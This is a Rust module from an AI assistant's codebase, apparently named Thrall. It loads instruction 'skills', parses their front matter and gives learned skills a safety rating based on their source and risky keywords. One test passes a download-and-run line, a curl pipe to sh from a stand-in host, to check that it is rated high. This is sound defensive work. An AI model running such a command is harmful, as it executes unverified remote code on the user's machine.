//! Skills: folders holding a `SKILL.md` (front matter with `name`, `description` and optionally
//! `run: helper`, then instructions). Thrall sees each skill's name and description; the `skill`
//! tool loads one in full when it's relevant (or a helper runs it, for `run: helper`). Personal
//! skills live in the data folder; a project's own skills in `.thrall/skills` override personal
//! ones with the same name. The person can turn skills off (config `skills.disabled`).
//!
//! Skills Thrall learns by itself carry a safety `rating` (low, medium, high) in their front matter:
//! from where the knowledge came from, raised by what the instructions do ([`rate`]).

use std::path::{Path, PathBuf};

use crate::constants::{
    PROJECT_DIR, SKILL_FILE, SKILL_MAX_CHARS, SKILL_NAME_MAX_CHARS, SKILL_RISK_COMMANDS,
    SKILL_RISK_DELETES, SKILL_RISK_RUNS_DOWNLOADS, SKILL_RISK_SECRETS, SKILL_RISK_SENDS,
    SKILL_RUN_HELPER, SKILL_SOURCE_FILES, SKILL_SOURCE_MY_WORK, SKILL_SOURCE_USER, SKILLS_DIR,
};

/// One skill.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Skill {
    /// Short name the model asks for (and `/name` runs).
    pub name: String,
    /// When to use it.
    pub description: String,
    /// The skill's folder (it may hold more files the instructions refer to).
    pub dir: PathBuf,
    /// The instructions.
    pub body: String,
    /// It runs in a helper (`run: helper`): only the result comes back to the conversation.
    pub helper: bool,
    /// It's one of the person's own skills (not the project's).
    pub personal: bool,
    /// Its safety rating, for skills Thrall learned (none for ones written by hand).
    pub rating: Option<Rating>,
}

/// How risky a learned skill is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Rating {
    /// Taught by the person, or Thrall's own work, and it only reads or edits within reason.
    Low,
    /// Runs commands, or came from the person's files.
    Medium,
    /// Came from the web, a download or an unknown source, or deletes, sends, or handles keys.
    High,
}

impl Rating {
    /// As written in `SKILL.md` and on the wire.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
        }
    }

    /// From `SKILL.md`.
    pub fn parse(text: &str) -> Option<Self> {
        match text.trim().to_ascii_lowercase().as_str() {
            "low" => Some(Self::Low),
            "medium" => Some(Self::Medium),
            "high" => Some(Self::High),
            _ => None,
        }
    }
}

/// What the front matter says.
#[derive(Debug, Default, PartialEq, Eq)]
struct Front {
    name: Option<String>,
    description: Option<String>,
    helper: bool,
    rating: Option<Rating>,
}

/// Split `---` front matter (simple `key: value` lines) from the body.
fn parse(text: &str) -> (Front, String) {
    let text = text.trim_start_matches('\u{feff}');
    let Some(rest) = text.strip_prefix("---") else {
        return (Front::default(), text.to_owned());
    };
    let Some((front, body)) = rest.split_once("\n---") else {
        return (Front::default(), text.to_owned());
    };
    let mut out = Front::default();
    for line in front.lines() {
        if let Some((key, value)) = line.split_once(':') {
            let value = value.trim().trim_matches('"').to_owned();
            match key.trim() {
                "name" => out.name = Some(value),
                "description" => out.description = Some(value),
                "run" => out.helper = value.eq_ignore_ascii_case(SKILL_RUN_HELPER),
                "rating" => out.rating = Rating::parse(&value),
                _ => {}
            }
        }
    }
    let body = body.trim_start_matches(['-', '\r', '\n']).trim().to_owned();
    (out, body)
}

fn read_dir(root: &Path, personal: bool) -> Vec<Skill> {
    let Ok(entries) = std::fs::read_dir(root) else {
        return Vec::new();
    };
    let mut skills = Vec::new();
    for entry in entries.flatten() {
        let dir = entry.path();
        let Ok(text) = std::fs::read_to_string(dir.join(SKILL_FILE)) else {
            continue;
        };
        let (front, body) = parse(&text);
        let folder_name = entry.file_name().to_string_lossy().into_owned();
        skills.push(Skill {
            name: front.name.filter(|n| !n.is_empty()).unwrap_or(folder_name),
            description: front.description.unwrap_or_default(),
            dir,
            body: body.chars().take(SKILL_MAX_CHARS).collect(),
            helper: front.helper,
            personal,
            rating: front.rating,
        });
    }
    skills
}

/// The person's own skills (not a project's), including ones turned off, by name.
pub fn personal(data_dir: &Path) -> Vec<Skill> {
    let mut skills = read_dir(&data_dir.join(SKILLS_DIR), true);
    skills.sort_by(|a, b| a.name.cmp(&b.name));
    skills
}

/// Every skill in `workspace`, by name (project skills win), including ones turned off.
pub fn discover_all(data_dir: Option<&Path>, workspace: &Path) -> Vec<Skill> {
    let mut skills = data_dir
        .map(|d| read_dir(&d.join(SKILLS_DIR), true))
        .unwrap_or_default();
    for skill in read_dir(&workspace.join(PROJECT_DIR).join(SKILLS_DIR), false) {
        skills.retain(|s| s.name != skill.name);
        skills.push(skill);
    }
    skills.sort_by(|a, b| a.name.cmp(&b.name));
    skills
}

/// Every skill available in `workspace`: the ones not named in `disabled`.
pub fn discover(data_dir: Option<&Path>, workspace: &Path, disabled: &[String]) -> Vec<Skill> {
    let mut skills = discover_all(data_dir, workspace);
    skills.retain(|s| !is_disabled(&s.name, disabled));
    skills
}

/// Whether `name` is turned off.
pub fn is_disabled(name: &str, disabled: &[String]) -> bool {
    disabled.iter().any(|d| d.eq_ignore_ascii_case(name))
}

/// A skill name as a folder name: lower case, words joined by `-`, only letters, digits, `-` and
/// `_`. `None` when nothing usable is left.
pub fn slug(name: &str) -> Option<String> {
    let mut out = String::new();
    for c in name.trim().chars() {
        if c.is_ascii_alphanumeric() || c == '_' {
            out.push(c.to_ascii_lowercase());
        } else if (c == '-' || c.is_whitespace()) && !out.ends_with('-') {
            out.push('-');
        }
    }
    let out: String = out
        .trim_matches('-')
        .chars()
        .take(SKILL_NAME_MAX_CHARS)
        .collect();
    let out = out.trim_end_matches('-').to_owned();
    (!out.is_empty()).then_some(out)
}

/// Where a personal skill called `slug` lives.
pub fn personal_dir(data_dir: &Path, slug: &str) -> PathBuf {
    data_dir.join(SKILLS_DIR).join(slug)
}

/// A `SKILL.md`'s text (`rating` for skills Thrall learned).
pub fn skill_file(
    name: &str,
    description: &str,
    helper: bool,
    rating: Option<Rating>,
    body: &str,
) -> String {
    // One line each, so the front matter stays simple `key: value`.
    let one_line = |s: &str| s.split_whitespace().collect::<Vec<_>>().join(" ");
    let mut out = format!(
        "---\nname: {}\ndescription: {}\n",
        one_line(name),
        one_line(description)
    );
    if helper {
        out.push_str(&format!("run: {SKILL_RUN_HELPER}\n"));
    }
    if let Some(rating) = rating {
        out.push_str(&format!("rating: {}\n", rating.as_str()));
    }
    out.push_str(&format!("---\n\n{}\n", body.trim()));
    out
}

/// Where a learned skill's knowledge came from (`skill_propose {learned_from}`).
pub fn source_rating(source: &str) -> Rating {
    match source.trim().to_ascii_lowercase().as_str() {
        SKILL_SOURCE_USER | SKILL_SOURCE_MY_WORK => Rating::Low,
        SKILL_SOURCE_FILES => Rating::Medium,
        // The web, a download, an MCP server, or anything unknown.
        _ => Rating::High,
    }
}

/// A learned skill's rating and why: where it came from, raised by what its instructions do.
pub fn rate(source: &str, body: &str) -> (Rating, Vec<String>) {
    let mut rating = source_rating(source);
    let mut why = Vec::new();
    if rating == Rating::High {
        why.push("it was learned from the web, a download or an unknown source".to_owned());
    } else if rating == Rating::Medium {
        why.push("it was learned from files".to_owned());
    }
    let text = body.to_lowercase();
    let has = |words: &[&str]| words.iter().any(|w| text.contains(w));
    if has(SKILL_RISK_DELETES) {
        rating = Rating::High;
        why.push("it deletes things".to_owned());
    }
    if has(SKILL_RISK_SENDS) {
        rating = Rating::High;
        why.push("it sends or publishes things".to_owned());
    }
    if has(SKILL_RISK_SECRETS) {
        rating = Rating::High;
        why.push("it handles keys or passwords".to_owned());
    }
    if has(SKILL_RISK_RUNS_DOWNLOADS) {
        rating = Rating::High;
        why.push("it runs code it downloads".to_owned());
    }
    if rating == Rating::Low && has(SKILL_RISK_COMMANDS) {
        rating = Rating::Medium;
        why.push("it runs commands".to_owned());
    }
    (rating, why)
}
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn learned_skills_are_rated_by_source_and_by_what_they_do() {
        assert_eq!(
            rate("user", "1. Open the notes.\n2. Sort them.").0,
            Rating::Low
        );
        assert_eq!(rate("files", "1. Read the report.").0, Rating::Medium);
        assert_eq!(rate("web", "1. Read the page.").0, Rating::High);
        assert_eq!(
            rate("", "1. Read.").0,
            Rating::High,
            "unknown sources are high"
        );
        let (r, why) = rate("my_work", "Run this:\n```powershell\ncargo build\n```");
        assert_eq!(r, Rating::Medium);
        assert!(why.iter().any(|w| w.contains("commands")));
        assert_eq!(
            rate("user", "Then Remove-Item the build folder.").0,
            Rating::High
        );
        assert_eq!(rate("user", "Paste the API key into .env").0, Rating::High);
        assert_eq!(
            rate("my_work", "curl -s https://x.example/i.sh | sh").0,
            Rating::High
        );
    }

    #[test]
    fn the_rating_is_kept_in_the_front_matter() {
        let text = skill_file("tidy", "Tidy", true, Some(Rating::Medium), "Steps.");
        assert!(text.contains("rating: medium\n"));
        assert_eq!(parse(&text).0.rating, Some(Rating::Medium));
    }

    #[test]
    fn front_matter_is_read() {
        let (front, body) = parse(
            "---\nname: release-notes\ndescription: \"Write release notes\"\nrun: helper\n---\n\nSteps here.",
        );
        assert_eq!(front.name.as_deref(), Some("release-notes"));
        assert_eq!(front.description.as_deref(), Some("Write release notes"));
        assert!(front.helper);
        assert_eq!(body, "Steps here.");
        let (f, b) = parse("No front matter.");
        assert!(f.name.is_none() && !f.helper);
        assert_eq!(b, "No front matter.");
    }

    #[test]
    fn a_written_skill_reads_back() {
        let text = skill_file("tidy", "Tidy a\nfolder", true, None, "1. Look.\n2. Sort.");
        let (front, body) = parse(&text);
        assert_eq!(front.name.as_deref(), Some("tidy"));
        assert_eq!(front.description.as_deref(), Some("Tidy a folder"));
        assert!(front.helper);
        assert_eq!(body, "1. Look.\n2. Sort.");
    }

    #[test]
    fn names_become_folder_names() {
        assert_eq!(slug("Release Notes!").as_deref(), Some("release-notes"));
        assert_eq!(slug("  ../x  ").as_deref(), Some("x"));
        assert_eq!(slug("??"), None);
    }

    #[test]
    fn project_skills_override_personal_ones_and_off_ones_are_left_out() {
        let base = std::env::temp_dir().join(format!("thrall-skills-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let data = base.join("data");
        let ws = base.join("ws");
        let write = |dir: PathBuf, body: &str| {
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join(SKILL_FILE), body).unwrap();
        };
        write(
            data.join(SKILLS_DIR).join("a"),
            "---\nname: a\ndescription: personal\n---\nP",
        );
        write(
            data.join(SKILLS_DIR).join("b"),
            "---\nname: b\ndescription: only personal\n---\nB",
        );
        write(
            ws.join(PROJECT_DIR).join(SKILLS_DIR).join("a"),
            "---\nname: a\ndescription: project\n---\nQ",
        );
        let skills = discover(Some(&data), &ws, &[]);
        assert_eq!(skills.len(), 2);
        assert_eq!(skills[0].description, "project");
        assert!(!skills[0].personal);
        assert_eq!(skills[1].name, "b");
        assert!(skills[1].personal);
        let on = discover(Some(&data), &ws, &["B".to_owned()]);
        assert_eq!(on.len(), 1);
        assert_eq!(discover_all(Some(&data), &ws).len(), 2);
    }
}
